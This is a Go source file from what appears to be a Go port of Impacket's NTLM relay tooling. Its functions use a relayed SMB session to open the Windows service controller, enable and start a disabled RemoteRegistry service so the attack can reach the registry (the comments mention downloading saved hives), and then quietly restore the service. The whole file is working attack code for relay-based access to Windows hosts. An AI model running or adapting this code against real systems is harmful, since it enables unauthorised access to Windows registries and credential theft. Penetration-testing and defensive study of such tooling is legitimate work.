// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0

package relay

import (
	"log"

	"github.com/Mzack9999/goimpacket/pkg/dcerpc"
	"github.com/Mzack9999/goimpacket/pkg/dcerpc/svcctl"
)

// remoteRegistryState captures what ensureRemoteRegistryStarted changed on
// the target so we can undo it after the winreg session is done.
type remoteRegistryState struct {
	startedByUs  bool
	wasDisabled  bool
}

// ensureRemoteRegistryStarted opens svcctl on the relayed SMB session, starts
// the RemoteRegistry service if it's stopped, and enables it first if it's
// disabled. Returns state that the caller should pass to
// restoreRemoteRegistryState on exit so we leave the target the way we found
// it. All failures here are warnings, not errors: if we can't manage the
// service (e.g., because the relayed token lacks SERVICE_* access) we let
// the caller attempt the winreg open anyway - it often still works if the
// service is already running.
func ensureRemoteRegistryStarted(client *SMBRelayClient) *remoteRegistryState {
	state := &remoteRegistryState{}

	sc, closeFn, err := openSvcctl(client)
	if err != nil {
		log.Printf("[-] Warning: could not open svcctl: %v", err)
		return state
	}
	defer closeFn()

	svcHandle, err := sc.OpenService("RemoteRegistry",
		svcctl.SERVICE_START|svcctl.SERVICE_STOP|svcctl.SERVICE_QUERY_STATUS|
			svcctl.SERVICE_QUERY_CONFIG|svcctl.SERVICE_CHANGE_CONFIG)
	if err != nil {
		log.Printf("[-] Warning: could not open RemoteRegistry service: %v", err)
		return state
	}
	defer sc.CloseServiceHandle(svcHandle)

	status, err := sc.QueryServiceStatus(svcHandle)
	if err != nil {
		log.Printf("[-] Warning: could not query RemoteRegistry status: %v", err)
		return state
	}
	if status.CurrentState != svcctl.SERVICE_STOPPED {
		log.Printf("[*] Service RemoteRegistry is already %s", svcctl.GetServiceState(status.CurrentState))
		return state
	}

	log.Println("[*] Service RemoteRegistry is in stopped state")

	if config, err := sc.QueryServiceConfig(svcHandle); err == nil && config.StartType == svcctl.SERVICE_DISABLED {
		log.Println("[*] Service RemoteRegistry is disabled, enabling it")
		state.wasDisabled = true
		if err := sc.ChangeServiceConfig(svcHandle, &svcctl.ChangeServiceConfigParams{
			ServiceType: svcctl.SERVICE_NO_CHANGE, StartType: svcctl.SERVICE_DEMAND_START, ErrorControl: svcctl.SERVICE_NO_CHANGE,
		}); err != nil {
			log.Printf("[-] Warning: could not enable RemoteRegistry: %v", err)
		}
	}

	log.Println("[*] Starting service RemoteRegistry")
	if err := sc.StartService(svcHandle); err != nil {
		log.Printf("[-] Warning: could not start RemoteRegistry: %v", err)
		return state
	}
	state.startedByUs = true

	// Poll until running. Brief loop: the pipe-open below happens before the
	// service fully registers its SCM endpoint otherwise, leading to the
	// intermittent PIPE_NOT_AVAILABLE.
	for i := 0; i < 10; i++ {
		if s, _ := sc.QueryServiceStatus(svcHandle); s != nil && s.CurrentState == svcctl.SERVICE_RUNNING {
			break
		}
	}

	return state
}

// restoreRemoteRegistryState stops the RemoteRegistry service (if we started
// it) and re-applies the SERVICE_DISABLED start type (if it was disabled
// before we enabled it). Errors are logged but not returned; we're on the
// cleanup path after the real work has completed.
//
// The caller's tree state may have moved off IPC$ (e.g., the attack switched
// to ADMIN$ to download a saved hive), so we re-TreeConnect to IPC$ before
// opening svcctl. That makes this function safe to invoke from any defer
// position without coupling it to the attack's tree management.
func restoreRemoteRegistryState(client *SMBRelayClient, state *remoteRegistryState) {
	if state == nil || (!state.startedByUs && !state.wasDisabled) {
		return
	}

	if err := client.TreeConnect("IPC$"); err != nil {
		log.Printf("[-] Warning: could not re-tree-connect to IPC$ for RemoteRegistry restore: %v", err)
		return
	}

	sc, closeFn, err := openSvcctl(client)
	if err != nil {
		log.Printf("[-] Warning: could not reopen svcctl to restore RemoteRegistry: %v", err)
		return
	}
	defer closeFn()

	access := uint32(svcctl.SERVICE_STOP)
	if state.wasDisabled {
		access |= svcctl.SERVICE_CHANGE_CONFIG
	}
	svcHandle, err := sc.OpenService("RemoteRegistry", access)
	if err != nil {
		log.Printf("[-] Warning: could not reopen RemoteRegistry to restore: %v", err)
		return
	}
	defer sc.CloseServiceHandle(svcHandle)

	if state.startedByUs {
		log.Println("[*] Stopping service RemoteRegistry")
		if _, err := sc.StopService(svcHandle); err != nil {
			log.Printf("[-] Warning: could not stop RemoteRegistry: %v", err)
		}
	}
	if state.wasDisabled {
		log.Println("[*] Restoring the disabled state for service RemoteRegistry")
		if err := sc.ChangeServiceConfig(svcHandle, &svcctl.ChangeServiceConfigParams{
			ServiceType: svcctl.SERVICE_NO_CHANGE, StartType: svcctl.SERVICE_DISABLED, ErrorControl: svcctl.SERVICE_NO_CHANGE,
		}); err != nil {
			log.Printf("[-] Warning: could not restore disabled start type: %v", err)
		}
	}
}

// openSvcctl opens the svcctl pipe on the relayed session, binds the
// service-controller RPC interface, and returns a controller plus a close
// function that tears down both the RPC binding and the pipe. IPC$ is
// already connected by the caller of the surrounding attack.
func openSvcctl(client *SMBRelayClient) (*svcctl.ServiceController, func(), error) {
	fileID, err := client.CreatePipe("svcctl")
	if err != nil {
		return nil, nil, err
	}
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}
	if err := rpcClient.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion); err != nil {
		client.ClosePipe(fileID)
		return nil, nil, err
	}
	sc, err := svcctl.NewServiceController(rpcClient)
	if err != nil {
		client.ClosePipe(fileID)
		return nil, nil, err
	}
	closeFn := func() {
		sc.Close()
		client.ClosePipe(fileID)
	}
	return sc, closeFn, nil
}
